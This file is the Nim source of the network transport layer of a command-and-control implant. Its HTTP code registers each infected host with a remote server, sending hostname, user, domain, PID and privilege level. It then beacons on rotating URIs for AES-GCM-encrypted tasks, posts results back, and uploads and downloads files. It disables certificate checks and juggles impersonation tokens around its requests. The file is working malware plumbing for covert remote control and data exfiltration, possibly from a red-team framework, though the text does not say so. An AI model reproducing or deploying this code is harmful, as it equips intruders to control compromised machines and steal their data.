## HTTP/SMB transport for the Nim agent.
## SMB: named-pipe client → Go pivot parent → C2 (no AES in Nim layer).
## HTTP: WinHTTP (Windows) or std/httpclient (Linux) with AES-GCM,
##       wire-compatible with the Go agent.
import config

when defined(windows):
  import winim/lean
  proc isElevated(): bool =
    var token: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr token) == 0: return false
    defer: discard CloseHandle(token)
    var elev: DWORD = 0; var sz: DWORD = sizeof(elev).DWORD
    discard GetTokenInformation(token, cast[TOKEN_INFORMATION_CLASS](20),
                                addr elev, sz, addr sz)
    if elev != 0: return true
    var linked: HANDLE = 0; sz = DWORD(sizeof(linked))
    if GetTokenInformation(token, cast[TOKEN_INFORMATION_CLASS](19),
                           addr linked, sz, addr sz) != 0 and linked != 0:
      defer: discard CloseHandle(linked)
      var elev2: DWORD = 0; var sz2: DWORD = sizeof(elev2).DWORD
      discard GetTokenInformation(linked, cast[TOKEN_INFORMATION_CLASS](20),
                                  addr elev2, sz2, addr sz2)
      if elev2 != 0: return true
    return false
else:
  import posix as posix_api
  proc isElevated(): bool = posix_api.geteuid() == 0

when Transport == "smb":
  include transport_smb
elif Transport == "tcp":
  include transport_tcp
elif Transport == "mtls":
  include transport_mtls
elif Transport == "dns":
  include transport_dns
else:
  # ── HTTP transport ────────────────────────────────────────────────────────────
  import std/[json, base64, strutils]
  import crypto

  type
    AgentTransport* = object
      serverUrl*: string
      agentId*:   string
      aesKey*:    seq[byte]
      uriIdx:     int
      uriList:    seq[string]

    TaskWire* = object
      id*:      int64
      typ*:     string
      args*:    string
      payload*: seq[byte]

  proc newTransport*(): AgentTransport =
    result.serverUrl = ServerUrl
    if BeaconURIs != "":
      result.uriList = BeaconURIs.split(',')

  # ── Platform-specific HTTP implementation ─────────────────────────────────────
  when defined(windows):
    import winim/inc/winhttp

    proc getEnvStr*(k, default: string): string =
      var buf = newWideCString(newString(512))
      let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
      if n == 0: return default
      return $buf

    proc exeName*(): string =
      when buildName != "":
        return buildName
      else:
        var buf = newWideCString(newString(MAX_PATH))
        let n = GetModuleFileNameW(0, buf, MAX_PATH)
        if n == 0: return "agent.exe"
        let full = $buf
        let i = max(full.rfind('\\'), full.rfind('/'))
        return if i < 0: full else: full[i+1..^1]

    proc httpDo(t: var AgentTransport; meth, path: string;
                body: seq[byte] = @[]): (int, seq[byte]) =
      let hSess = WinHttpOpen(newWideCString(UserAgent),
        WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
      if hSess == nil: return (0, @[])
      defer: discard WinHttpCloseHandle(hSess)
      var scheme = "http"
      var host = ""
      var port = INTERNET_PORT(80)
      var rest = ""
      if t.serverUrl.startsWith("https://"):
        scheme = "https"; port = INTERNET_PORT(443); rest = t.serverUrl[8..^1]
      elif t.serverUrl.startsWith("http://"):
        rest = t.serverUrl[7..^1]
      let slash = rest.find('/')
      host = if slash < 0: rest else: rest[0..<slash]
      if ':' in host:
        let p = host.rfind(':')
        port = INTERNET_PORT(parseInt(host[p+1..^1])); host = host[0..<p]
      let fullPath = if slash < 0: path else: rest[slash..^1] & path
      let hConn = WinHttpConnect(hSess, newWideCString(host), port, 0)
      if hConn == nil: return (0, @[])
      defer: discard WinHttpCloseHandle(hConn)
      let flags = if scheme == "https": DWORD(WINHTTP_FLAG_SECURE) else: DWORD(0)
      let hReq = WinHttpOpenRequest(hConn, newWideCString(meth), newWideCString(fullPath),
        nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
      if hReq == nil: return (0, @[])
      defer: discard WinHttpCloseHandle(hReq)
      var secFlags = DWORD(SECURITY_FLAG_IGNORE_UNKNOWN_CA or
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE or SECURITY_FLAG_IGNORE_CERT_CN_INVALID or
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
      discard WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, DWORD(sizeof(secFlags)))
      let bodyPtr: LPVOID = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: nil
      if not WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
          bodyPtr, DWORD(body.len), DWORD(body.len), 0).bool: return (0, @[])
      if not WinHttpReceiveResponse(hReq, nil).bool: return (0, @[])
      var code: DWORD; var codeSize = DWORD(sizeof(code))
      discard WinHttpQueryHeaders(hReq, DWORD(WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER),
        WINHTTP_HEADER_NAME_BY_INDEX, addr code, addr codeSize, WINHTTP_NO_HEADER_INDEX)
      var resp: seq[byte]
      var buf = newSeq[byte](8192)
      var got: DWORD
      while true:
        if not WinHttpReadData(hReq, cast[LPVOID](addr buf[0]), DWORD(buf.len), addr got).bool: break
        if got == 0: break
        resp.add(buf[0..<int(got)])
      return (int(code), resp)

  else:
    # ── Linux / non-Windows HTTP using std/httpclient ─────────────────────────
    import std/[httpclient, net, os]

    proc getEnvStr*(k, default: string): string =
      result = os.getEnv(k, "")
      if result.len == 0: result = default

    proc exeName*(): string =
      when buildName != "":
        return buildName
      else:
        let p = os.getAppFilename()
        let i = p.rfind('/')
        if i < 0: return p
        return p[i+1..^1]

    proc httpDo(t: var AgentTransport; meth, path: string;
                body: seq[byte] = @[]): (int, seq[byte]) =
      try:
        when defined(ssl):
          let ctx = newContext(verifyMode = CVerifyNone)
          let client = newHttpClient(sslContext = ctx)
        else:
          let client = newHttpClient()
        defer: client.close()
        client.headers = newHttpHeaders({
          "User-Agent": UserAgent,
          "Content-Type": "application/octet-stream"
        })
        let url = t.serverUrl & path
        let resp = if meth == "GET":
          client.get(url)
        else:
          client.request(url, httpMethod = HttpPost,
                         body = cast[string](body))
        return (resp.code.int, cast[seq[byte]](resp.body))
      except:
        return (0, @[])

  # ── Common transport API (calls httpDo internally) ────────────────────────────

  proc register*(t: var AgentTransport): bool =
    when defined(windows):
      let hostname = getEnvStr("COMPUTERNAME", "UNKNOWN").toLowerAscii()
      let domainU  = getEnvStr("USERDOMAIN", "")
      let userOnly = getEnvStr("USERNAME", "UNKNOWN")
      let username = if domainU.len > 0: domainU & "\\" & userOnly else: userOnly
      let osStr    = "windows/amd64"
      let pidVal   = int(GetCurrentProcessId())
    else:
      var hbuf: array[256, char]
      discard posix_api.gethostname(cast[cstring](addr hbuf[0]), 256.cint)
      let hostname = $cast[cstring](addr hbuf[0])
      let username = getEnvStr("USER", "unknown")
      let osStr    = "linux/amd64"
      let pidVal   = int(posix_api.getpid())
    let info = %*{
      "hostname": hostname,
      "username": username,
      "os": osStr,
      "pid": pidVal,
      "transport": config.Transport,
      "sleep_sec": SleepSec,
      "jitter_pct": JitterPct,
      "process_name": exeName(),
      "is_admin": isElevated(),
      "parent_id": ParentID,
      "language": "nim"
    }
    let resumeId = if t.agentId.len > 0: t.agentId else: AgentPresetID
    if resumeId.len > 0:
      info["resume_id"] = %resumeId
    let (code, resp) = t.httpDo("POST", "/register", cast[seq[byte]]($info))
    if code != 200 or resp.len == 0: return false
    try:
      let j = parseJson(cast[string](resp))
      t.agentId = j["agent_id"].getStr()
      t.aesKey = cast[seq[byte]](base64.decode(j["aes_key"].getStr()))
      return true
    except: return false

  proc beacon*(t: var AgentTransport): seq[TaskWire] =
    var path = "/beacon/" & t.agentId
    if t.uriList.len > 0:
      path = t.uriList[t.uriIdx mod t.uriList.len] & "/" & t.agentId; inc t.uriIdx
    let (code, resp) = t.httpDo("GET", path)
    if code == 204 or resp.len == 0 or code != 200: return @[]
    let plain = openGCM(t.aesKey, resp)
    if plain.len == 0: return @[]
    try:
      let j = parseJson(cast[string](plain))
      for tw in j["tasks"]:
        var task = TaskWire(id: tw["id"].getBiggestInt(),
          typ: tw["type"].getStr(), args: tw{"args"}.getStr(""))
        if tw{"payload"}.getStr("") != "": task.payload = cast[seq[byte]](base64.decode(tw["payload"].getStr()))
        result.add(task)
    except: discard

  proc postWithRevert(t: var AgentTransport; path: string; body: seq[byte]) =
    ## Drop thread impersonation so WinHTTP uses the process primary token.
    ## A make-token LOGON_NEW_CREDENTIALS context can cause WinHTTP POSTs to
    ## fail silently; reverting before the POST and restoring after is safe.
    when defined(windows):
      var hSavedImp: HANDLE = 0
      block:
        var hTh: HANDLE = 0
        if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, WINBOOL(1), addr hTh) != 0:
          discard DuplicateTokenEx(hTh, TOKEN_ALL_ACCESS, nil,
                                   SecurityImpersonation, TokenImpersonation, addr hSavedImp)
          discard CloseHandle(hTh)
          discard RevertToSelf()
      discard t.httpDo("POST", path, body)
      if hSavedImp != 0:
        discard ImpersonateLoggedOnUser(hSavedImp)
        discard CloseHandle(hSavedImp)
    else:
      discard t.httpDo("POST", path, body)

  proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
    let plain = cast[seq[byte]]($(%*{"task_id": taskId, "output": output, "error": errStr}))
    t.postWithRevert("/result/" & t.agentId, sealGCM(t.aesKey, plain))

  proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                        output, errStr: string; isAdmin: bool) =
    let plain = cast[seq[byte]]($(%*{
      "task_id": taskId, "output": output, "error": errStr, "is_admin": isAdmin}))
    t.postWithRevert("/result/" & t.agentId, sealGCM(t.aesKey, plain))

  proc uploadFile*(t: var AgentTransport; taskId: int64; filename: string; data: seq[byte]) =
    discard t.httpDo("POST", "/upload/" & t.agentId & "/" & filename, sealGCM(t.aesKey, data))

  proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
    let (code, resp) = t.httpDo("GET", "/dl/" & t.agentId & "/" & filename)
    if code != 200 or resp.len == 0: return @[]
    return openGCM(t.aesKey, resp)
